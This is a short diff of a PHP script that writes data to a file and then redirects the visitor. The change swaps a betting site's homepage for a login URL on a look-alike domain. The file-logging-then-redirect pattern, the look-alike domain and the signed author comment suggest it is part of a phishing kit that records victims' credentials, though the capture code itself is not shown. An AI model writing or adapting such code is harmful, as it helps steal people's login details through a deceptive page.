@@ -12,7 +12,7 @@ fwrite($handle,"\r\n");
 }
 fwrite($handle,"\r\n");
 fclose($handle);
-header("location:https://parimatch.in/");
+header("location:https://pm-bet.in/en/login/");
 exit;
 // https://www.facebook.com/AnuragDhakal11
 ?>
